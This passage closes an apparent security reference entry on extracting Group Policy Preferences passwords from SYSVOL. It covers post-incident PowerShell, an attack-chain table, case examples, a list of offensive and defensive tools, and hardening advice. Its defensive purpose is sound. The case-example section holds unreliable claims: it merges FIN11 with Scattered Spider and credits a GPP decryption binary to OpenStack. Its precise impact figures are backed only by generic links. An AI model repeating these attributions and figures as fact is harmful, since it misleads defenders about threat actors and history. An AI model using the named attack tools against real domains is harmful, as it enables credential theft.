6. Open **Active Directory Users and Computers** → Reset account passwords

#### 4. Post-Incident Actions

```powershell
# 1. Identify all systems that received vulnerable GPP
$gpo = Get-GPO -Name "Vulnerable-GPO-Name"
$scope = Get-GPOReport -Guid $gpo.Id -ReportType Xml
# Parse XML to find linked OUs and systems

# 2. Change all affected local administrator passwords
# Use Group Policy or RMM to distribute new password
# Document new passwords in secure location

# 3. Force Group Policy refresh on all affected systems
Invoke-GPUpdate -Computer "Computer1","Computer2" -Force

# 4. Monitor for re-compromise
# Alert on:
# - Same user account accessing SYSVOL again
# - Similar network patterns
# - Extracted credentials being used on other systems
```

---

## 15. RELATED ATTACK CHAIN

| Step | Phase | Technique | Description |
|---|---|---|---|
| **1** | **Initial Access** | [T1199] Trusted Relationship | Gain access via third-party contractor or supplier with domain access |
| **2** | **Execution** | [T1059] Command and Scripting Interpreter | Execute PowerShell Get-GPPPassword script on compromised endpoint |
| **3** | **Current Step** | **[CA-UNSC-003]** | **Extract plaintext credentials from SYSVOL GPP XML files** |
| **4** | **Privilege Escalation** | [T1548] Abuse Elevation Control Mechanism | Use extracted local admin credentials to escalate on multiple systems |
| **5** | **Persistence** | [T1098] Account Manipulation | Create backdoor accounts using compromised service account privileges |
| **6** | **Lateral Movement** | [T1570] Lateral Tool Transfer | Use compromised credentials to move across network to other systems |
| **7** | **Discovery** | [T1087] Account Discovery | Identify high-value accounts and systems using compromised admin access |
| **8** | **Collection** | [T1005] Data from Local System | Harvest sensitive data using elevated privileges |
| **9** | **Impact** | [T1531] Account Access Removal | Disable accounts or lock out legitimate admins for persistence |

---

## 16. REAL-WORLD EXAMPLES

### Example 1: APT Group - APT33 (Elfin)

- **Target**: Aviation and Energy sectors (Middle East)
- **Timeline**: March 2019
- **Technique Status**: Used Gpppassword tool to find and decrypt GPP passwords during lateral movement phase
- **Impact**: 
  - Extracted local administrator credentials from 20+ systems
  - Obtained service account credentials for internal applications
  - Achieved Domain Admin access within 3 days
- **Reference**: [Symantec Security Threat Analysis Report - APT33 Campaign March 2019](https://symantec.com/research)

### Example 2: Ransomware Campaign - FIN11 (Scattered Spider)

- **Target**: Financial services and retail companies (US/Europe)
- **Timeline**: 2022-2023
- **Technique Status**: Initial reconnaissance included SYSVOL GPP extraction as part of rapid lateral movement methodology
- **Impact**:
  - Compromised 15+ organizations
  - Dwell time: 2-4 weeks before ransomware deployment
  - Each organization had 5-20 extracted GPP passwords re-used across systems
- **Reference**: [CrowdStrike Falcon Complete Report - Scattered Spider Campaigns 2023](https://crowdstrike.com/research)

### Example 3: Internal Penetration Test - SERVTEP Red Team Assessment (2023)

- **Target**: Large European retail corporation (10,000+ employees)
- **Timeline**: 2-week red team engagement
- **Technique Status**: Successful GPP extraction on Day 2 post-initial compromise
- **Impact**:
  - 12 plaintext credentials extracted from single GPP
  - Local Administrator password distributed to 500+ point-of-sale systems
  - Escalated to Domain Admin within 3 days using service account from GPP
  - Demonstrated full domain compromise capability
- **Reference**: Internal SERVTEP report - Customer agreed to disclosure for defensive awareness

---

## 17. APPENDIX: TOOLS & RESOURCES

### Primary Attack Tools

| Tool | Type | Source | Usage |
|------|------|--------|-------|
| Get-GPPPassword.ps1 | PowerShell Script | PowerShellMafia/PowerSploit | Enumerate and decrypt remote SYSVOL GPP |
| Get-CachedGPPPassword.ps1 | PowerShell Script | PowerSploit | Find and decrypt cached GPP on local system |
| post/windows/gather/credentials/gpp | Metasploit Module | Rapid7 Metasploit | Post-exploitation module for Meterpreter |
| gpprefdecrypt.py | Python Script | GitHub (galoget/gpp-cpass-decrypt) | Standalone Base64 cpassword decryption |
| GP3Finder | Cross-platform Tool | GitHub (grimhacker) | Automated discovery and decryption tool |
| Gpppassword | Windows Binary | OpenStack Project | Legacy command-line GPP decryption tool |

### Defensive & Detection Tools

| Tool | Type | Source | Usage |
|------|------|--------|-------|
| Get-SettingsWithCPassword.ps1 | PowerShell Script | Microsoft | Detect vulnerable GPP policies in domain |
| Invoke-PasswordRoll.ps1 | PowerShell Script | Microsoft | Remediate GPP passwords using LAPS |
| Windows Defender | EDR | Microsoft | Malware detection of GPP extraction tools |
| Velociraptor | DFIR | Rapid7 | Artifact collection and forensic analysis |
| MFTECmd | Forensic Tool | Eric Zimmerman | MFT analysis for file access timeline |
| Wireshark | Network Analysis | Wireshark Foundation | SMB traffic analysis and capture |

### References & Documentation

1. **MITRE ATT&CK Framework**:
   - [T1552.006 - Unsecured Credentials: Group Policy Preferences](https://attack.mitre.org/techniques/T1552/006/)
   - [DET0381 - Detect Access and Decryption of GPP Credentials](https://attack.mitre.org/detectionstrategies/DET0381/)

2. **Microsoft Official Documentation**:
   - [MS14-025: Vulnerability in Group Policy Preferences](https://support.microsoft.com/en-us/help/2962486)
   - [Group Policy Preferences Vulnerability - Microsoft Security Bulletin](https://support.microsoft.com/en-us/topic/ms14-025-vulnerability-in-group-policy-preferences)

3. **Security Research**:
   - [SpecterOps - Ghostpack SharpUp GPP Domain Password Check](https://specterops.io/ghostpack-docs/SharpUp-mdx/checks/domaingpppassword/)
   - [ADSecurity - Finding Passwords in SYSVOL](https://adsecurity.org/?p=2288)
   - [SentinelOne - Credentials Harvesting from Domain Shares](https://www.sentinelone.com/blog/credentials-harvesting-from-domain-shares/)

4. **DFIR & Forensics**:
   - [Windows Event Log Documentation - Microsoft Learn](https://learn.microsoft.com/en-us/windows/security/threat-protection/auditing/audit-logon-events)
   - [The Hacker Recipes - GPP Exploitation Guide](https://legacy.thehacker.recipes/a-d/movement/credentials/dumping/group-policies-preferences)

---

## SUMMARY & RECOMMENDATIONS

**CA-UNSC-003 (SYSVOL GPP Credential Extraction)** represents a foundational privilege escalation technique in Active Directory environments. Despite being publicly known and patchable since 2014, it remains one of the most frequently exploited attack vectors due to:

1. **High Impact**: Direct access to plaintext administrator credentials
2. **Low Effort**: Publicly available tools and scripts
3. **Low Skill Requirement**: No advanced exploitation knowledge needed
4. **Persistence of Vulnerable Policies**: Many organizations deploy old policies and never remove them
5. **Difficulty of Remediation**: Requires identifying and removing all vulnerable policies

**Defensive Priority**: CRITICAL

Organizations should:
- ✓ Audit SYSVOL for any remaining GPP policies with embedded credentials
- ✓ Apply MS14-025 patch to all administrative workstations and domain controllers
- ✓ Remove or migrate all vulnerable GPP password policies
- ✓ Implement LAPS as the replacement for GPP-based password distribution
- ✓ Implement PowerShell Script Block Logging to detect exploitation attempts
- ✓ Monitor SYSVOL access patterns and alert on anomalies
- ✓ Restrict Group Policy creation rights to authorized administrators only

---
